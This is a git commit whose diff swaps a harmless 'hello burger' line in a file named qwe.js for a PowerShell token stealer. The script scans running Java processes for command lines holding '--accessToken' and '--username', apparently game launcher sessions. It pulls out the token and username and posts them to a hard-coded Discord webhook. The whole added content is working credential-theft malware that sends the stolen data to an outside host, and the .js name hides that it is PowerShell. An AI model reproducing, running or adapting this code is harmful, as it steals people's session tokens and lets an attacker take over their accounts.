922c2fb352783130c5c8f7c85f63fb2ca987d460
drhaplan-dotcom <drhaplan@gmail.com>
2026-08-18 19:37:43 +0200

    Update qwe.js

--- qwe.js
+++ qwe.js
@@ -1,2 +1,33 @@
-@echo off
-powershell -NoExit -Command "Write-Host 'hello burger'"
+$webhookUrl = "https://discord.com/api/webhooks/1368083966749315142/s5w1ApIDhPKB7r72CMgHRRpBNLXIy6IKFDAszbBVn3cgasLmvQdfojruiAIAT5vhYBJr"
+
+Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name LIKE 'Java%' AND CommandLine LIKE '%accessToken%'" |
+    Select-Object -ExpandProperty CommandLine |
+    ForEach-Object {
+        $accessToken = $null
+        $username = $null
+
+        if ($_ -match '--accessToken\s+(\S+)') {
+            $accessToken = $matches[1]
+        }
+        if ($_ -match '--username\s+(\S+)') {
+            $username = $matches[1]
+        }
+
+        if ($accessToken -and $username) {
+           
+            $message = @"
+> **AccessToken:** $accessToken
+> **Username:** $username
+"@
+
+            Write-Output $message
+
+            
+            $payload = @{
+                content = $message
+            } | ConvertTo-Json -Depth 10
+
+            
+            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
+        }
+    } 
